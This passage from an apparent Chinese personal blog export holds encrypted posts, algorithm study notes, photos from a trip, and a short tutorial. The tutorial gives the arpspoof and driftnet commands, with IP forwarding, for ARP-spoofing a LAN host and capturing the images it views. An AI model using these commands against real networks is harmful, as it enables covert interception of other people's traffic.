63c6fa2b73fd8545ec6f8d936f886001bcfde919c84912bfba08c24fd007fff02b12bdb56d49a01f57317ef1a27bb9e33bdd62762744059df6886d51dcf10c96ffb92e0d0a30e32a6238b4375faabaa420cbc09b07daf0e9629372a34fa9a0d745912161924aadf860ac91ab16a822e901a5a58406b8a77c9432a3a3f0ed885c5cccaaf2ae53f30d6f780d27a8c7d1da47c568ef9d7a0021e70a2d4b77e20e3fa70bbac85e6a5b3351c095b71c0956ff6c134529d8844879e8040354ec841c5ca53339e7e2b0e5ffa58f6cab433f0cae6522a8993a88132f8ee1bc7f9f01ed539bcfee3c79887e753ab092a0e5b43abfa2492ebdad5854849e66bd708f2c2fdb83dfce7648c1e244ed08948c6ba8c42d0dc144b56cac746ad6bb675deba7c04e520e261947cf63263e00a95a2444d69181620b3c0603ba3c93cc289d69d1c6919ea60b5d8c8feb66d815c53d942427dd85d37fe861673eb0daaf205b6e5e5657a140be093e6acd0225c04abb075a2da4811c1db02e97ad78f21efc2654fabf517f117c93dcbf42e67c7127a7eb707c2ae00a3f70ee4e1a322c770ad7363e4e827d9c95c82417eba2c7e162a1302cb6fefcd71dea4c49d8b0af7b743626eff850c30d8db73fb109537dbcdc79655ead3b5d5f23bc695c3c925876048a7e1a3972d0f1711753fcc03cf996b2c628274bf74b9053112e48fee77d0eef82f10d444c5ebbbec65200b2f53ba9e34dd1d1618f5df50dbb541b23c388090c48c0a4085ce58bb89ad35c4358fcbc394d1d7140706de96e8488e0ce2a6d369e25429eeb0cfa27cc8ab6f0d561d4c093daddee01f4e95318e2fd5b54e42580a348c5adce46798b9f362f15cd122d9c791f21b8395a674b274148f908b8027af273de97a1e5e3f86cf31767ce37c283f0896f4bc38c3bab096cce7ceba70f6791c08c1cc4ec9529dcd18541a0fe462cda8951a1f8461fa3ebf8632775ab795f77d335b8dd751add8e8810289ebb4fdfe405f1add687ce57c60c5cbfb12f3320d3594ac2bd6799c207c72323c5ff8226b2e77e30601984ab1e911f5ab6ff1a2559c997f0f9cc32be2ea6c3ce6d78637b30fc48f850d2518e550d7cd9ac5e5025fb82495587c763abbc8e938a8ac51f770d1b990fd5ee25fab08775370096f7e9b668b12b0a24b5e4eda7ebed4e6489df63ba941c1ced8722b550b259780e5d3eb4160a5b409f2fad8cb09eab8ab8a4067db63d6b6f449b1aceb6968453cc37eace722366123f6d378e85f864e37c6ac3ecbee175bff95602661a8b3baed4c13888e2c76697820dc218412b1efb6755785e507c190ce48b088bd986ab35e4d7e45bf6e14a9f8eaffaf2e74e491bab8e2ec7db8a8bbb61ce8c14f6b7a9fbf3d913d570a0a368ddbe0decc655040301c06cf33f9ba197c849c6d320c8f256c6c0449e31c1b4411c817adf384b009ae548ed2c63e68acf78e9275259653ce3c4570c98f19c1935bee69aa937c0935c884dccc66c76d192028942ae5f1cf6fb050eb1a5bf68a9d9fa188a5b9a21fee678472c916a1ded73e5895f11b41aafcc1932aa1aa1875b847197b7d0a925b1e5a5a73973129e2cb7fd5b6fb004a197ef9f985275a5b92aa2dc851a463f9062451754de4edf0d74d166b3800ae73d73b290bd993076d20596d963b928595a213084fc1ebd24fe62edcfbcd0d4e762631b95aef3cdad65f91c613d2dd1509e97b5f34e90b7fe7833ea2dd0ef970495d2e04b75a82c639da4ddc49fc0138e1c639bf704f431d48ff0b55b67789a14070bb4c32db7701a3d352f7dbc1f247942300b019957d1dc5eaedeec8bd3825e9b73efe109e1d7d3654887650849cc9299e4f8e4ed838ee7be7656c8e9c9ff1a538de6c96a87202f7405383e67ea5ca7f2feeb0567dd14b8b04ab64181a5e09048b85acd504891a908992312661427be872afcf931b95dd5d72e1813e3c7525dc8d6aed078b705bf8ff906cad3af9a63bcd335fb498a8a391f7541bdb22f3e7ff04a8976f6f1a6432e5d41e5fe0dcd092cd5f22165e49a98d0cbffe7cadc900a29c7fb8cf5ef06891a4eedb49b01d32d5659f3dc99174a7f8534660123a57f5d7dbf6d5b3cf4b71d1f48bf5c93905e77363a3b24f24cb33dc57f432208a1927b42580db20ad3962fbaf9a8ef9a7d593a792bf9dabab4c3c530523b480ea54652f0f300b3bd1d373b8ef982fa64c96a00398dc976359a62bf4c73fd6a5d652156987fe4eef1e05a1d488586082eb019a21fa6ba9f7f7cba865fe64a9dd85f0b2ce1e8ca5ceb3e585e3ca63437dd8af227b21b703911ed48bc140c2dd2dee2b0eeb7df2de1a4a8e12f435db0f8a6d6082b98c2aa44ae41450aa7773694ca90d03c4f821eb54302b85d9f290f618fe0e85d2298e8498662322733cfd3cf08d97b48117153e3569ceaf935371662fc8065339dc7c6a269d1bbb7a355e54048859d2fe53f33e1fa4bf670e928252c0621d895a159a581b6f9e0b7540c32c6799eee71ef7393dd78738cb69b25f729f98006825159a6c3ae1135cb4d3786e9240273cb32715a3fbb02e635377d4ec505f7c9b2bbc30ecf546fca986ac6546856eeffdc1929f60e3b41f7dd42a508996040728391cf09d038fad2e15d3ef29a80977972abfb6259f56294818185acad8b2b98457bcc917586450a4b4328d55637043cbed3cd64dc8f1ab0f20c7e84d582df15ff9791a0aed23230302634e06fe33761079362b07ec911268a689139c6ddef590503ef04af12d624917ad92c82d8c1148332ebf612c60c455288e1d02f5661450955b1e51a33629f423effbc5e940d2c58979b0ba32ac9287418bc87dac0bc0233b2c48bec5ca0a854ecfcf927341b3210321ad191499f354</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>XAMPP-DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>算法复习笔记</title>
    <url>/post/algorithm/</url>
    <content><![CDATA[<p>&amp;nbsp;<font face="楷体">11.19复习笔记</font></p>
<h3 id="二、递归与分治策略"><a href="#二、递归与分治策略" class="headerlink" title="二、递归与分治策略"></a><font face="楷体">二、递归与分治策略</font></h3><h4 id="1-递归与分治"><a href="#1-递归与分治" class="headerlink" title="(1)递归与分治"></a><font face="楷体">(1)递归与分治</font></h4><p><a href="https://s1.ax1x.com/2018/11/19/FpNSaQ.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNSaQ.jpg" alt="1"></a><br><a href="https://s1.ax1x.com/2018/11/19/FpNp5j.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNp5j.jpg" alt="2"></a></p>
<h4 id="2-二分搜索技术"><a href="#2-二分搜索技术" class="headerlink" title="(2)二分搜索技术"></a><font face="楷体">(2)二分搜索技术</font></h4><p><a href="https://s1.ax1x.com/2018/11/19/FpNCPs.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNCPs.jpg" alt="3"></a></p>
<h4 id="3-线性时间选择、最接近点对"><a href="#3-线性时间选择、最接近点对" class="headerlink" title="(3)线性时间选择、最接近点对"></a><font face="楷体">(3)线性时间选择、最接近点对</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2eBt.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2eBt.jpg" alt="3"></a><br>&amp;nbsp;<br>&amp;nbsp;<br><font face="楷体">11.20复习笔记</font></p>
<h3 id="三、动态规划"><a href="#三、动态规划" class="headerlink" title="三、动态规划"></a><font face="楷体">三、动态规划</font></h3><h4 id="1-矩阵连乘"><a href="#1-矩阵连乘" class="headerlink" title="(1)矩阵连乘"></a><font face="楷体">(1)矩阵连乘</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV23cj.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV23cj.jpg" alt="4"></a></p>
<h4 id="2-最长公共子序列"><a href="#2-最长公共子序列" class="headerlink" title="(2)最长公共子序列"></a><font face="楷体">(2)最长公共子序列</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2UEV.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2UEV.jpg" alt="5"></a></p>
<h4 id="3-最长子段和、凸多边形、图像压缩"><a href="#3-最长子段和、凸多边形、图像压缩" class="headerlink" title="(3)最长子段和、凸多边形、图像压缩"></a><font face="楷体">(3)最长子段和、凸多边形、图像压缩</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2B34.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2B34.jpg" alt="6"></a></p>
<h4 id="4-电路布线"><a href="#4-电路布线" class="headerlink" title="(4)电路布线"></a><font face="楷体">(4)电路布线</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2yuR.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2yuR.jpg" alt="7"></a></p>
<h4 id="5-流水作业调度、0-1背包"><a href="#5-流水作业调度、0-1背包" class="headerlink" title="(5)流水作业调度、0-1背包"></a><font face="楷体">(5)流水作业调度、0-1背包</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV22E6.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV22E6.jpg" alt="8"></a><br>&amp;nbsp;<br>&amp;nbsp;<br><font face="楷体">11.21复习笔记</font></p>
<h3 id="四、贪心算法"><a href="#四、贪心算法" class="headerlink" title="四、贪心算法"></a><font face="楷体">四、贪心算法</font></h3><h4 id="1-活动安排、背包问题"><a href="#1-活动安排、背包问题" class="headerlink" title="(1)活动安排、背包问题"></a><font face="楷体">(1)活动安排、背包问题</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV25gH.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV25gH.jpg" alt="9"></a></p>
<h4 id="2-最优装载、哈夫曼编码、单源最短路径"><a href="#2-最优装载、哈夫曼编码、单源最短路径" class="headerlink" title="(2)最优装载、哈夫曼编码、单源最短路径"></a><font face="楷体">(2)最优装载、哈夫曼编码、单源最短路径</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2LUf.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2LUf.jpg" alt="10"></a></p>
<h4 id="3-最小生成树"><a href="#3-最小生成树" class="headerlink" title="(3)最小生成树"></a><font face="楷体">(3)最小生成树</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2jPS.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2jPS.jpg" alt="11"></a></p>
<h4 id="4-多机调度问题"><a href="#4-多机调度问题" class="headerlink" title="(4)多机调度问题"></a><font face="楷体">(4)多机调度问题</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FVRurR.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FVRurR.jpg" alt="12"></a></p>
<h3 id="五、回溯法"><a href="#五、回溯法" class="headerlink" title="五、回溯法"></a><font face="楷体">五、回溯法</font></h3><p><a href="https://s1.ax1x.com/2018/11/28/FVR1IK.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FVR1IK.jpg" alt="13"></a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>台儿庄古镇</title>
    <url>/post/ancientcityoftaierzhaung/</url>
    <content><![CDATA[<p>*ˊᵕˋ)੭</p>
<span id="more"></span>
<p>2019&#x2F;4&#x2F;5和小伙伴们去“天下第一庄”的台儿庄古城耍去了。</p>
<ul>
<li>买菜</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca8786e30421.jpg" alt="IMG_5084.JPG"></p>
<ul>
<li>游玩</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca8796cee02f.jpg" alt="IMG_5093(20190406-025326).jpg"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a201ab46.jpg" alt="IMG_5096.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a3671598.jpg" alt="IMG_5099.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a56a399c.jpg" alt="IMG_5108.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a5715da7.jpg" alt="IMG_5104(20190405-203354).jpg"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87a574d36e.jpg" alt="IMG_5114.JPG"></p>
<ul>
<li>玩傣族手鼓的小姐姐很漂亮哈….(。・∀・)ノ</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87abc8a8a6.jpg" alt="IMG_5119.JPG"></p>
<ul>
<li>来一波合照</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87b530cbd9.jpg" alt="IMG_5122.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87b5741e21.jpg" alt="IMG_5125.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87ae337ea0.jpg" alt="IMG_5123.JPG"></p>
<ul>
<li>一起做饭（瀚哥做菜手艺真的不错(oﾟvﾟ)ノ）</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87c1d26cb8.jpg" alt="IMG_5121.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87c509b5af.jpg" alt="IMG_5128.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87c51e400b.jpg" alt="IMG_5130.JPG"></p>
<ul>
<li>哈哈，不错不错！凉拌猪肉，瀚哥特地带了家里面的腌菜和藠头。</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87c9d19065.jpg" alt="IMG_5131.JPG"></p>
<ul>
<li>还有三七炖鸡….</li>
</ul>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87ca4910ba.jpg" alt="IMG_5132.JPG"></p>
<p><img data-src="https://i.loli.net/2019/04/06/5ca87ca511992.jpg" alt="IMG_5133.JPG"></p>
<ul>
<li>还算不错，哈哈。</li>
</ul>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《arp欺骗获取目标主机浏览的图片》</title>
    <url>/post/arp-picture/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、driftnet</strong><br>&amp;nbsp;</p>
<h3 id="一、ARP欺骗、流量转发"><a href="#一、ARP欺骗、流量转发" class="headerlink" title="一、ARP欺骗、流量转发"></a>一、ARP欺骗、流量转发</h3><table><tr><td bgcolor=#D1EEEE>第一步“开启ip转发”
命令:echo 1 >/proc/sys/net/ipv4/ip_forward        （回车没有任何的返回）
第二步查看转发是否成功
第三步另开窗口“开始欺骗”
命令：arpspoof -i eth0 -t 192.168.1.10 192.168.1.1        （回车之后不断欺骗运行中~~~[记得这个窗口需要保留]）</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.10 192.168.1.1</span><br></pre></td></tr></table></figure>
<h3 id="二、使用driftnet获取图片"><a href="#二、使用driftnet获取图片" class="headerlink" title="二、使用driftnet获取图片"></a>二、使用driftnet获取图片</h3><table><tr><td bgcolor=#D1EEEE>命令：driftnet -i eth0（获取的图片会自动给保存，可以看它新开窗口的保存路径）
“查看目标的图片信息”弹出的窗口请不要关闭，在窗口就可以看到获取信息。
</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈 C 和其他语言</title>
    <url>/post/c-grammer/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="aeaaadff4e5492de62f04fbfe22b73c58820d39996df08ab897afc32b9158975">65b591f270a691a8bcf50a13db064a05af21ee7fd58671e0b31adf42ba4309d383c9c4614a1c17101c51e9f6397ac6a315840d5d60657ad6201bc39ff6d83a4f8504cf31896be4a40395ec759e4c19ace1de4c417119fa479ceccfffcc3d9e8ecde16bb9429959598469a6f6585d7bc21dff9b2a9192da32b8902d1154d889a0d83bca40112f679a86459fbea5528960d0416d492c375cb1ea34c02763ea3eb71efdd7710087403dbaba3ce893fc2f4070ba8f814f234b3c1858ee86d8760ba0024a90159167e4d4183ee9acd7f2367620f099b30ca370fb78a5df8ae7ce18f76ec32f7df3a1d5026d43441878efc219bc7c4d16504a136f59532993d997c5b200f93cd24b4ed26687866e74f217d159b93492b6692677cafb71098e3fe7bc623d5a6abad444fbac6cba97caa8621b8cd765bf06687656addaea960245cfd5267d830c8b24ce02438af62773b0c451fdc9b01690cb398bb78bb504e99976eea9511a805e69fa294c7131dab207d902cd2879e8b9e2e705dae168864819042f9253e8b3daf6fc1007670e09dc47cff965af103ca770e744dd301d019debc7955b92373f95440955625edecee6708e1416e7cfd2a964a6a56f7fde8bcacc0a0debc09b2c7aef203d28504f3d8ad08f69a99189c137823553e6a01130ca51775f529e9589c065a1fde5b44bc9d552954c1d2f5cbb8a63b9206a37cab8febdaac450cd0cb123a87ea7cf65ecab5ecf3425dac4b6c1836cc9984359d17e84a1cfcc07c89f3f00877668ad1a98a587be69ba32f1b735d350ce839b206fa6857b61a9e1af11e38b07a8c0bf74967603dc2cd630d334965b500a505918ed6c13bfeba354288b220f53d8ad76fc4162523f00d0b6296898a14261b8698e6d807c61005b4b8f7d733b865a6ad627c03cdda98941842b6b8d47ef73c1cdbf4527f367b65110eb9b9abdc26ecca5c633711e8cc6ec6cdac97f092bfbb2a1fb78bcc68c90361e158d58f274ff054966a3213ead80e707c7d7d2ae214f9e1e3d09b716abe09dc4b78c80b983626251bb70464d193600cc7d460240ce9fd1a73731109bda3febfd737e55c9e0bf40b0d76c440a1fb60dc0466fb4232cd169ac19cde668d143f3184da0e2030c80ac52a043d7ab4b484484f0a878fcc835bab7f248a0456c4cc33b391c09f7b463b07dcd07a3a72b456140008ecf8f06a043c1a951b07b21c964d65b0fb6aa81076adb4e0023bf4779c0dc51c946831eabefea8b1a891744ec9b2c6708fa061cf063ed53890b1dc89e269b6bcb65c596cfd7f74e9f7666c1db8cfb558ef331fd010242566f9fbe342db5b06332aecb98f4a20e76505ebe39817cff80fc7e83246de573cd7a80d87fe1fe24832b8c1bb94f8c630ed21d5d45c144e159d54d3bce704ed32fcc71ea37e954f37fcf0b70c79101bdc017e9520836d475c2ae3a958d1c831a5151b8f9a4b9bf822b6c8ab00b735aa0727373627e75b3675f3ec7e2e9636c2e153d563c1cb4241d6179696c2e52eae889472c6956a697c292d11ee0387bfc61ab7b6cb10d150f21c1a99ad7a47e7d1a894e25de883c9c307b56d1a41763552ae254488ba4f5ff7cfbee35c6014571c9ac50c8e53d8a592269e01c7fd37075bda8138f556edf3268518eaa7881717a14f1feb9b335a246945c2c4e6ee746f0d1e34c3257474cf26b830a83e64633247153e2659ff07f4290cdafbf2923ece96a16a4b09ad2a76d5b442c1be9924d800b7c685eadfdf6f7b99ab3afbb176f31e31d3e38c7267da26c20394939749ab57d01e8fce1bdd8a6505db3450c176322ef0f782e2f1a6ad35f3fea398b8a7fe3607dcd245bbd6dc84c78344e414c73cc5be2fb1a3242e55e330ba3b672c4c032956cf59ee990c7a31af70afd127b3bfc770af4a25fe92a07679d2f404333c5d86ff4facb5dbfac8b2354b9563095961c8b7c9c4dc582f25453f3bd948662b60fd41826e7d08b18e0942a53ad987ac5d60faa0ca0e2dfb6cab33e748f682eed29e0185a4f1a9fe2ddb2ff4b6ef6bd62b9107d3673e3adf8eb1567fbcd5d28c8cd4f6837a24704740e7a629062ab5087ea98db12937c83cfacb6c48165190be3a43d99b5e1dbc0426972cc8dccfedfd993d568606fb6866003b337492d3e40f21acd94f7e5ff3159b14e4e69c9024ceeaeca74978b272ebb1f6794550895bb11064c303237e66dc958c67b7bfae1aaff9cb0536ff82d38cf44e811aca34b0dfe567e538f7fd576e5595119d8a55dc03e7a849e571fd86af038aac7d5661d2e4be234d967e231f5510fa929267db5eda18203b72fe6f5ff64815f674885e8b7a3a747128e3c5ccdb619ed7292055ca97b220af9f744feda0534cbccee62ae7d4c8405b9f8050b51f921d8a9e9accd734bbd420073dd1151587cd1449bb80ebbd99a1b12c240e0831d4280fc22db5a7ba80333e4e719c2d8b5e9db823b8476014e0f2dec099d768cbed11d95215f8c3f43b3c15335b8ffdf41e05961e8215a932312afa4e513b9f6e454e0ef728b8c8d68b482494af4b2bf20ea0c3caefb66c84182a7f3dd64ed59456c4834a3249f7543e88bc07d003b3e8d1f5d49fc2207f08bea702eb2781e65160a23a6fa5b5d6725b10ca2f56869b63c4d8716ad45a84f7be4c363cc3ed9e466bcd018b43559d7eef70f67d1f7287ff6fdde009c26c06aa20e109784d86795e34555d487573495a1256059b0d0853d19f8d0321bdb66b0e643b833bb7f488a8bbe010fac6a13265e797071392ac15f703cf617f329921b67ee229ba87e33ab17d6047287c7a475dedcb45c85522bb2ffb3af28b49613e6f85fc7e7e24a75dd46cfca4d066d4150ec91d49eb564fa9a251ff588218992cea6fa34d22f8afea4c9f212636c4dddde36158e93699e2e5e6edddd48a8aa5f041951de28f4a79de7f0d5b9ded07ca28501ab018ded7faca1389fd437b2f6fd8c48700f32bda3514e052f58322b2dafce18a1681f72102bcb6ae9935db2b7aad3901e85b4665e032710cb0c0421a89ae5a2ed100d0777aaba1c37aa349c3547ca8a224590d9d37f8a81c897ad9f0382fc4dd7f06110471fcacf452f6a6c1ca8c0fe1c3724d378e50657f7e1e7b948e2ad13648cd2b0dd1851945c53f4e9b85543424f98c7cd8b78066805bfa056cef159aeb90212145bc41007a32f5cac582e301d14f3ca056fe3082f6f562abcee4ac8eb6b66de247b0676e3cda018a832ac7ca4b20b033d92a67201cfcb4783c660430ec79880370d4f434e6b2d45fea325cdcbee7f09a8178d6074baa9d56eae61bdee0228d7b0ac1ec25333121b922d0de01a48dfeb346474bbe266608d1e9d1ae5267ceeeb11886c31c209c116729af83bd20c69e1c55c3e3a4982b563801a2504d2d7ddb3d7d4e95bb1ab39d92aa24cce661f70c941fdf3c7d55700111c73ac43885fa456663c7152c608165d3c88ad2cf54e6ff8d7e3f8a5976edc399e045e9f27e9945395e3311c7552116b90ed5b69965dfe92cf7da79c90194e265c7d54f44418514faa5acb48098967714d2511cc2115b1d4bc0ede690f51708c8b192110e5d93ace4e1187a9662729148ceda917693b205055a6491337f796609dd8cfd6041a932f7f811b30d6910a8775e965bba30bff37fa3ed712317f808f01542523ed6bc57cf476df75a475c1e5044da300dd860922af261281566e028e11fca0499dbcc662d757828fca006cf54f9bca2c6d1ba4d8a6ec1f8b4f2fb843e6b1e750824fe48890fab493e8f7de61679fc909fa3a2b503f6518d9e9253525a78fcf70f8a44c9899820d1bb054e5adc29179615753163d287436b3d7d703974ea026173da8651c394e597bb2c92d66814a97a766998c19ace4b7f5b69d1686e87fd44ffb3887ec12afaad6963db61fa34e5d6952ebab2aa12653460c1ca2a72006937133e19fe901dde0108b85854605a263f34f4c98cfb2c70657ee12a44506230ead177fdbf73ff6773daf351dcfe667950f8fe68d3d50026506d567c06d5025449c1a2737d05bf7fc1d7725ae3b585fae2c6b8795c1f9d74e5a80d9a3bc8bcc21192685ba5b93e2b907653b869ef9a6517abec7ae13708f751659d0bfc36f89ff49bd98d30214f661d8205ec5e594c87cd6fc188d10eae84bbf391dd3d6bfbde817301cc2d37d57da44fc70d0e755948fc25d563cd522d03264d76aafce18b5232d4b70a739726d4b7abbebd61acb00b6bd5d20d303f392ea227d35ecdf3ce8b2f8176a5d46aa949a172e86ab966c48bdf497c12d09be372f24104f0c8a828d4683689175b0b2f13814b3cdbb098cd62b5a09fbd9054278e90e977ec4394177f0a8e9058ca7d14fdf839c7425cb349993d02dbad7e4c8f6d6c417d996b183c83130d60cb445c4302d488d265d78172ed7abdae4c118d693593ab1f1e1e02c6593a70d7879640b6956cb39581f6c075b4138f417b9d83f71fb95d818d6d204988a2143aff0104b289556275a1eda501386b32d15cbe439279cebc716cba0a76a315225d13c50c8067eca699c5dec064fc8e15aea60501b126c9dea2360b9a9b44b9ff6021faf623abdee99a80aa0d055edcffce2681cc65c7f5139a9e9c1bba7d5e696cde66aabe51952175cc09991940d8f96cefa916e713c59faec29996429f487ebcb79a663a9df74cecf645946dc9e46b3ab2887df73dc9bc450c334a62436a3008e9ce8ba2e973c1b214d8e7ca604eb76bec6d534c2fa9111f891e4209a966e15975a9f2b0c11b3c98ae92c5602a2b378ad9739ff3f0ecc3700eecf7c314d7186f937eb3309171322ff374399ab9340f8314341942d830346c3d183e62a6d93fdef1ff6e22a01821ecf4e81c9974bd3c44c2bba8315a5b54545e2b44c45f896df8ae6e9a2d22899a549bf2b68dd0e362c7077fcb6ec11e674aedb96643dd40bdeee04ecea8e9093a8bf1b6984c60c67d3099f18e31e6ed0820af56870fbb4c53c14d19d5fb4c97b4ca7da0dc3172f736edac796f3a947c3a13e10d502f83c29d7ac07189f2ab2cbdd121f7698cb36e314f0b564b2ba250fe3e27ea6bd705dc4dcfd95529b4d1e92e2848a126e011f8ebef34842d6328c36c1932926cd8a80733db6078215ab8397b58c1da04194c444a37be4df5ea5f7812e7d3b7f7bd955d6de8541f0fd338d81c66cb923e4c7a6551c590bd1ae8cb407eea0b43c73be234176b6080d9daa08b3f93226bab16eb36879faec15c583d3afdd1cbd4f5176d672308a5d52e1aaa2b14ecaa76fc71110f0e12b876000e52939bf3d2b05283c43010f65f3806d53b65934bc668470248e3c06594ad5e9626f340e0f228a77a26980820d500a6e80b621333fc5e750dec3f6b61b90d98d5d1e2ea285ea5c3a2588e162c5f56f69528c59d632a37e0a6bf8909672ee7d611b465b8a792a2ced58fddda4c1cebf3ea58282ba0797f2b048513f963a54b0352edec2181809ed3656bae3978470c7bce4d734cdd9a17ba8ba5b869b276da7de5ea75929b19d18533916beb3e05d19ccbd96eb15dada6544a1ac75a7c9c4b946cde901d364a50a4197f9ce530e95ab3a073b4e80f311c229dc94913d19a2437fb6945c888f8bd6bd85f5e53ab8d50f4c36a3c7e61e00a9f3c5e85c2efcd2e6a8017e454149d9703dbb934185735293d687fa23a8579868efa3521ac249c87149047fe29849730c9b9a3e45631301dc1f1fc6f7a6c6387a9a6fe9ed919ecedb30a61389d787999acd3c55f384161fface87c68c9c035502d25cfe5f1ce9fc494d8860f1146883435cf6db8f831924b9c073c561524c6440bf4738334cf9be8d4cd30319fb7441056a4dbd51f1a0d0d87eee2463e3d1492ba3bfe25c7dfa032f3439ebf9d1efe49c53d77dbb0320232110737876d597f58151e7cac32ec661225cf7c08bc96d40a71f4091b1912b1f87a13df7b7eb92f7fcd89571addddec3f421016be8419002cec6f540dd5b0cc26e17fe9b9d58305f706b64b10ff9c62392c687e632e319f9dd17d0f5e9fa315d29717e9e4c3563a2c9582ffeed90b0f0fa21ef97015415c963d650092fef672ca657aaa3ef5cad30b19543f577995b8d3d5388f1c2d40e6e6f6cceee45f84fcbaccccc7bc1584d137a461e5e77f68136b6412410d48b387f6ad2725d7e8417433053644ca96e440d2fecaea1f840b02d9cfe981ef008b5730e4da31c1918d9cba94d28e12b08a7962c079104019a6b59697d098b01db217631f6f5e02ec57b1d2a8584f3532faac458049f468d90dd06b6aff907f10145123b0366d430e1a29cef5b2ea35eca9efbc421d7b93663e8533b0c2bfabd9ebf3c1aa89d6ebf3b1392a69b95878cf38a5ac6e36bffbe1513e8b6b99b69fd001306d587775fb02cdeeadc9112caedb2d64673361e4f6733413eaaffa4e90b3979f44479b17dcaba748b7640a0e662a414d840998013b999a4b9031f5357ef7ff1315de4d6b027282d4e16799143a061a63edacee0c8c19d2c56041075305d5567c1d7f051975dcc4fda6b071cf782732beb5027778589f74cf719baee913265661aaea9bd1a3fa078551438bce60953f17c748e236c70ac2d12a903193991fc9d4580838f8e55899486e873c1956898a7b189830b00d4248b03db05378eae0d55f31fd640ac9bfd08cfcd6f060e08a1c0f3f35421d0ac74e284529388d265dfd097c6bd1b96bf6282c71bdcc8cb0d21449d02e7b929aca02e2dad496566448c41f61976fd21cfffe38923017dcb26639f68f2ad8397924b56a27190f573e612b11c1158eaf77c9c057ee9d41cc8a45a1676a0dfdc47262d78dd8f795ec275c87d1ac49d940a51f58c57ca24c68dcaf6e3fc1453600c1e6033063f29360d2a12ee71e60fece3ad4a2843ffbb7d6a68fc6716486517614dbe59faff700fd38e2958cee0e88b6205ca26c6cee7013a2a61c79bc80a65e0e6f90f81733f96d10ad3691d05d629409468647b19c3451dce11a2a8b789fafb125c4ce6f5b2904ab4c22a54ce4a22049c3a1da51d1ae6af82153ca791013ae65fbf4893c2fa535f622a667312f026aa4589f3dbf31525b9d869ff71b347bd07c28ef90b21025b7e158e6cc0ad22e638c6fec34267a2e350f1c9a367f00ba53d087d5dad2f307a453f368c46db7484ee50207fc338698ff18889a3966ad21badce0a0076da896782300ffd50c10ccaaddd859ad32d2dd3d97603d398e64d0546fc0f7203933f9bcdb80e4b2c1fa4a974b91691af64e0cdaeb4c4f89e08ee1ac22e7c2a13a82082a6c9b6b7cf2d6f1549b24ac560c812836a50c9df6876bd4ee4ad2b9566b646e41fbf63dbd833845abd216361895ee644fdd76ba3045108bf072dc2cf05fae19871ff447ddef3299d208c6e923bc8f23f6e0fee2d50b423bfc6814a9ffb8ab8055055ead4